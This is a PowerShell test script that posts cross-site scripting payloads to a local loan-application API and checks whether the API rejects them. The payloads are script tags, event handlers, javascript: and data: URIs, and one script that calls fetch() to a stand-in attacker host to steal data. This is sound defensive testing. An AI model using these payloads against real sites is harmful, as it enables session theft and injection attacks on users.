# XSS Attack Testing - PowerShell Command Examples
# For Windows users - Use these commands to test your API endpoints

# Configuration
$BASE_URL = "http://localhost:3000"
$API_ENDPOINT = "/api/trpc"
$OUTPUT_FILE = "xss-test-results.txt"

Write-Host "`n╔════════════════════════════════════════════════════════════════╗" -ForegroundColor Blue
Write-Host "║          XSS ATTACK TESTING - PowerShell Commands              ║" -ForegroundColor Blue
Write-Host "╚════════════════════════════════════════════════════════════════╝`n" -ForegroundColor Blue

Write-Host "Starting XSS vulnerability testing..." -ForegroundColor Yellow
Write-Host "Results will be saved to: $OUTPUT_FILE`n" -ForegroundColor Yellow

# Clear output file
"" | Out-File $OUTPUT_FILE

# Function to test an endpoint
function Test-Endpoint {
    param(
        [string]$Name,
        [string]$Method,
        [string]$Endpoint,
        [string]$PayloadJson
    )
    
    Write-Host "Testing: $Name" -ForegroundColor Yellow
    
    $url = "$BASE_URL$Endpoint"
    $headers = @{"Content-Type" = "application/json"}
    
    try {
        if ($Method -eq "POST") {
            $response = Invoke-RestMethod -Method POST -Uri $url -Headers $headers -Body $PayloadJson
        } else {
            $response = Invoke-RestMethod -Method GET -Uri $url -Headers $headers -Body $PayloadJson
        }
        
        $responseJson = $response | ConvertTo-Json
        
        # Add to results file
        Add-Content $OUTPUT_FILE "=================="
        Add-Content $OUTPUT_FILE "Test: $Name"
        Add-Content $OUTPUT_FILE "Method: $Method"
        Add-Content $OUTPUT_FILE "Endpoint: $Endpoint"
        Add-Content $OUTPUT_FILE "Payload: $PayloadJson"
        Add-Content $OUTPUT_FILE "Response: $responseJson"
        Add-Content $OUTPUT_FILE ""
        
        # Check response
        if ($responseJson -match "error|VALIDATION_ERROR|XSS_DETECTED") {
            Write-Host "✅ BLOCKED - API rejected the malicious input" -ForegroundColor Green
        } else {
            Write-Host "⚠️  WARNING - Input was accepted, verify sanitization" -ForegroundColor Red
        }
    } catch {
        Write-Host "❌ Error: $($_.Exception.Message)" -ForegroundColor Red
        Add-Content $OUTPUT_FILE "Error: $($_.Exception.Message)"
    }
    
    Write-Host ""
}

# ============================================================================
# TEST SET 1: Script Injection in fullName field
# ============================================================================
Write-Host "`n═══════════════════════════════════════════════════════════════════" -ForegroundColor Blue
Write-Host "TEST SET 1: Script Injection in fullName Field" -ForegroundColor Blue
Write-Host "═══════════════════════════════════════════════════════════════════`n" -ForegroundColor Blue

$payload1 = @{
    fullName = '<script>alert("XSS")</script>'
    email = 'test@example.com'
    phone = '5551234567'
    password = 'SecurePass123!'
    dateOfBirth = '1990-01-15'
    ssn = '123-45-6789'
    street = '123 Main St'
    city = 'New York'
    state = 'NY'
    zipCode = '10001'
    employmentStatus = 'employed'
    monthlyIncome = 5000
    loanType = 'installment'
    requestedAmount = 10000
} | ConvertTo-Json

Test-Endpoint -Name "Basic <script> tag in fullName" -Method "POST" -Endpoint "$API_ENDPOINT/loans.createApplication" -PayloadJson $payload1

# ============================================================================
# TEST SET 2: Event Handlers
# ============================================================================
Write-Host "`n═══════════════════════════════════════════════════════════════════" -ForegroundColor Blue
Write-Host "TEST SET 2: Event Handlers in fullName Field" -ForegroundColor Blue
Write-Host "═══════════════════════════════════════════════════════════════════`n" -ForegroundColor Blue

$payload2 = @{
    fullName = '<img src=x onerror="alert(\"XSS\")">'
    email = 'test@example.com'
    phone = '5551234567'
    password = 'SecurePass123!'
    dateOfBirth = '1990-01-15'
    ssn = '123-45-6789'
    street = '123 Main St'
    city = 'New York'
    state = 'NY'
    zipCode = '10001'
    employmentStatus = 'employed'
    monthlyIncome = 5000
    loanType = 'installment'
    requestedAmount = 10000
} | ConvertTo-Json

Test-Endpoint -Name "img tag with onerror event" -Method "POST" -Endpoint "$API_ENDPOINT/loans.createApplication" -PayloadJson $payload2

$payload3 = @{
    fullName = '<svg onload="alert(\"XSS\")"></svg>'
    email = 'test@example.com'
    phone = '5551234567'
    password = 'SecurePass123!'
    dateOfBirth = '1990-01-15'
    ssn = '123-45-6789'
    street = '123 Main St'
    city = 'New York'
    state = 'NY'
    zipCode = '10001'
    employmentStatus = 'employed'
    monthlyIncome = 5000
    loanType = 'installment'
    requestedAmount = 10000
} | ConvertTo-Json

Test-Endpoint -Name "SVG onload event" -Method "POST" -Endpoint "$API_ENDPOINT/loans.createApplication" -PayloadJson $payload3

# ============================================================================
# TEST SET 3: JavaScript Protocol URIs
# ============================================================================
Write-Host "`n═══════════════════════════════════════════════════════════════════" -ForegroundColor Blue
Write-Host "TEST SET 3: JavaScript Protocol URIs" -ForegroundColor Blue
Write-Host "═══════════════════════════════════════════════════════════════════`n" -ForegroundColor Blue

$payload4 = @{
    fullName = 'John Doe'
    email = 'test@example.com'
    phone = '5551234567'
    password = 'SecurePass123!'
    dateOfBirth = '1990-01-15'
    ssn = '123-45-6789'
    street = '123 Main St'
    city = 'New York'
    state = 'NY'
    zipCode = '10001'
    employer = 'javascript:alert("XSS")'
    employmentStatus = 'employed'
    monthlyIncome = 5000
    loanType = 'installment'
    requestedAmount = 10000
} | ConvertTo-Json

Test-Endpoint -Name "javascript: protocol in employer" -Method "POST" -Endpoint "$API_ENDPOINT/loans.createApplication" -PayloadJson $payload4

# ============================================================================
# TEST SET 4: Data URIs
# ============================================================================
Write-Host "`n═══════════════════════════════════════════════════════════════════" -ForegroundColor Blue
Write-Host "TEST SET 4: Data URIs" -ForegroundColor Blue
Write-Host "═══════════════════════════════════════════════════════════════════`n" -ForegroundColor Blue

$payload5 = @{
    fullName = 'John Doe'
    email = 'test@example.com'
    phone = '5551234567'
    password = 'SecurePass123!'
    dateOfBirth = '1990-01-15'
    ssn = '123-45-6789'
    street = '123 Main St'
    city = 'New York'
    state = 'NY'
    zipCode = '10001'
    employer = 'data:text/html,<script>alert("XSS")</script>'
    employmentStatus = 'employed'
    monthlyIncome = 5000
    loanType = 'installment'
    requestedAmount = 10000
} | ConvertTo-Json

Test-Endpoint -Name "data:text/html URI in employer" -Method "POST" -Endpoint "$API_ENDPOINT/loans.createApplication" -PayloadJson $payload5

# ============================================================================
# TEST SET 5: HTML Entity Encoding Bypass
# ============================================================================
Write-Host "`n═══════════════════════════════════════════════════════════════════" -ForegroundColor Blue
Write-Host "TEST SET 5: HTML Entity Encoding Bypass" -ForegroundColor Blue
Write-Host "═══════════════════════════════════════════════════════════════════`n" -ForegroundColor Blue

$payload6 = @{
    fullName = '&lt;script&gt;alert("XSS")&lt;/script&gt;'
    email = 'test@example.com'
    phone = '5551234567'
    password = 'SecurePass123!'
    dateOfBirth = '1990-01-15'
    ssn = '123-45-6789'
    street = '123 Main St'
    city = 'New York'
    state = 'NY'
    zipCode = '10001'
    employmentStatus = 'employed'
    monthlyIncome = 5000
    loanType = 'installment'
    requestedAmount = 10000
} | ConvertTo-Json

Test-Endpoint -Name "HTML entity encoded script" -Method "POST" -Endpoint "$API_ENDPOINT/loans.createApplication" -PayloadJson $payload6

# ============================================================================
# TEST SET 6: Email Field Attacks
# ============================================================================
Write-Host "`n═══════════════════════════════════════════════════════════════════" -ForegroundColor Blue
Write-Host "TEST SET 6: Email Field Attacks" -ForegroundColor Blue
Write-Host "═══════════════════════════════════════════════════════════════════`n" -ForegroundColor Blue

$payload7 = @{
    fullName = 'John Doe'
    email = 'test@example.com<script>alert("XSS")</script>'
    phone = '5551234567'
    password = 'SecurePass123!'
    dateOfBirth = '1990-01-15'
    ssn = '123-45-6789'
    street = '123 Main St'
    city = 'New York'
    state = 'NY'
    zipCode = '10001'
    employmentStatus = 'employed'
    monthlyIncome = 5000
    loanType = 'installment'
    requestedAmount = 10000
} | ConvertTo-Json

Test-Endpoint -Name "Script injection in email" -Method "POST" -Endpoint "$API_ENDPOINT/loans.createApplication" -PayloadJson $payload7

# ============================================================================
# TEST SET 7: Loan Purpose Attacks
# ============================================================================
Write-Host "`n═══════════════════════════════════════════════════════════════════" -ForegroundColor Blue
Write-Host "TEST SET 7: Loan Purpose Field Attacks" -ForegroundColor Blue
Write-Host "═══════════════════════════════════════════════════════════════════`n" -ForegroundColor Blue

$payload8 = @{
    fullName = 'John Doe'
    email = 'test@example.com'
    phone = '5551234567'
    password = 'SecurePass123!'
    dateOfBirth = '1990-01-15'
    ssn = '123-45-6789'
    street = '123 Main St'
    city = 'New York'
    state = 'NY'
    zipCode = '10001'
    employmentStatus = 'employed'
    monthlyIncome = 5000
    loanType = 'installment'
    requestedAmount = 10000
    loanPurpose = '<script>fetch("http://attacker.com/steal")</script>'
} | ConvertTo-Json

Test-Endpoint -Name "JavaScript fetch in loanPurpose" -Method "POST" -Endpoint "$API_ENDPOINT/loans.createApplication" -PayloadJson $payload8

# ============================================================================
# TEST SET 8: Valid Input (Should Pass)
# ============================================================================
Write-Host "`n═══════════════════════════════════════════════════════════════════" -ForegroundColor Blue
Write-Host "TEST SET 8: Valid Input (Should Pass)" -ForegroundColor Blue
Write-Host "═══════════════════════════════════════════════════════════════════`n" -ForegroundColor Blue

$payload9 = @{
    fullName = 'John Doe'
    email = 'john.doe@example.com'
    phone = '5551234567'
    password = 'SecurePass123!'
    dateOfBirth = '1990-01-15'
    ssn = '123-45-6789'
    street = '123 Main St'
    city = 'New York'
    state = 'NY'
    zipCode = '10001'
    employmentStatus = 'employed'
    employer = 'Tech Corp'
    monthlyIncome = 5000
    loanType = 'installment'
    requestedAmount = 10000
    loanPurpose = 'Home improvement'
} | ConvertTo-Json

Test-Endpoint -Name "Valid loan application (should succeed)" -Method "POST" -Endpoint "$API_ENDPOINT/loans.createApplication" -PayloadJson $payload9

# ============================================================================
# Summary
# ============================================================================
Write-Host "`n════════════════════════════════════════════════════════════════════" -ForegroundColor Blue
Write-Host "TEST SUMMARY" -ForegroundColor Blue
Write-Host "════════════════════════════════════════════════════════════════════`n" -ForegroundColor Blue

Write-Host "✅ All tests completed!" -ForegroundColor Green
Write-Host "`nResults saved to: $OUTPUT_FILE" -ForegroundColor Yellow
Write-Host ""
Write-Host "To view results:" -ForegroundColor Cyan
Write-Host "  cat $OUTPUT_FILE" -ForegroundColor White
Write-Host ""
Write-Host "Recommendations:" -ForegroundColor Cyan
Write-Host "  1. Review each response to verify XSS payloads were blocked"
Write-Host "  2. Look for error messages indicating validation failures"
Write-Host "  3. Ensure no payloads executed any JavaScript"
Write-Host "  4. Check that valid input (Test Set 8) was accepted"
Write-Host ""

# Display results
Write-Host "RESULTS:" -ForegroundColor Cyan
Get-Content $OUTPUT_FILE
